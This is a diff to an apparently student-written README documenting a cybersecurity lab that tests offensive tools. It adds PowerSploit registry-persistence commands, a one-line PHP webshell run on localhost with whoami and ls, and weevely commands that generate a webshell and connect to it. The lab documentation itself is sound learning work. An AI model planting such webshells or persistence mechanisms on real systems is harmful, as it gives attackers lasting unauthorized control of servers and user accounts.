@@ -76,12 +76,6 @@ Screenshots were taken during testing, with sensitive information blacked out.
 ### 4. Recon-ng
 **Features tested:**
 
-Module installation (marketplace install recon/domains-hosts/bing_domain_web)
-
-Domain reconnaissance (options set SOURCE google.com)
-
-Automated query execution (run)
-
 **Screenshots:**
   
 ---
@@ -120,6 +114,35 @@ Automated query execution (run)
 ![Metasploit Payload](https://github.com/NavinRamaiah/Cyber-Security-/blob/main/WhatsApp%20Image%202026-02-28%20at%2010.32.22%20AM%20(1).jpeg)
 
 ---
+### 4. Powersploit
+**Features tested:**
+Import Persistence module (Import-Module ./Persistence.psm1)
+
+List available persistence functions (Get-Command -Module Persistence)
+
+Registry persistence option (New-UserPersistenceOption -Registry -AtLogon)
+
+**Screenshots:**
+
+---
+**Features tested:**
+
+Simple PHP webshell execution (<?php system($_GET["cmd"]); ?>)
+
+http://localhost/shell.php?cmd=pwd → /var/www/html
+
+http://localhost/shell.php?cmd=whoami → www-data
+
+http://localhost/shell.php?cmd=ls → listed files (index.html, shell.php)
+
+Weevely shell generation (weevely generate mypassword shell.php)
+
+Weevely connection and command execution (weevely http://localhost/shell.php mypassword)
+
+**Screenshots:**
+
+---
+
 
 ## 📊 Comparison & Conclusions
 
